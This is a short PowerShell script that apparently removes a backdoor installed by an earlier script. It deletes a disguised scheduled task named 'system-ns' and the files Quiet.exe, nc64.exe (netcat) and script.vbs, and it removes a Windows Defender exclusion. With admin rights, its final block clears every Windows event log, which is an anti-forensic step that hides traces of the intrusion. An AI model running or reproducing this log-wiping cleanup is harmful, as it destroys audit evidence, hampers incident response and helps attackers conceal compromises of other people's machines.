# Check if the script is running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Set the installation path based on admin status, matching the original script
if ($isAdmin) {
    $installPath = "C:\Windows"
} else {
    $installPath = Join-Path $env:USERPROFILE "System"
}

# Remove the scheduled task if it exists
$taskName = "system-ns"
$task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($task) {
    # Stop the task if it is currently running
    if ($task.State -eq "Running") {
        Stop-ScheduledTask -TaskName $taskName
    }
    # Unregister the task
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

# List of files to delete, matching those downloaded by the original script
$filesToDelete = @("Quiet.exe", "nc64.exe", "script.vbs")
foreach ($file in $filesToDelete) {
    $filePath = Join-Path $installPath $file
    if (Test-Path $filePath) {
        # Remove the file, including hidden files, using -Force
        Remove-Item $filePath -Force
    }
}

# Remove the directory if it was created and is now empty, but only if it's not the Windows system directory
if ($installPath -ne $env:SystemRoot) {
    if (Test-Path $installPath) {
        $items = Get-ChildItem $installPath
        if ($items.Count -eq 0) {
            Remove-Item $installPath -Force
        }
    }
}

# Perform admin-only cleanup tasks
if ($isAdmin) {
    # Remove the Windows Defender exclusion added by the original script
    Remove-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue

    # Clear all Windows event logs
    wevtutil el | ForEach-Object { wevtutil cl $_ }
}
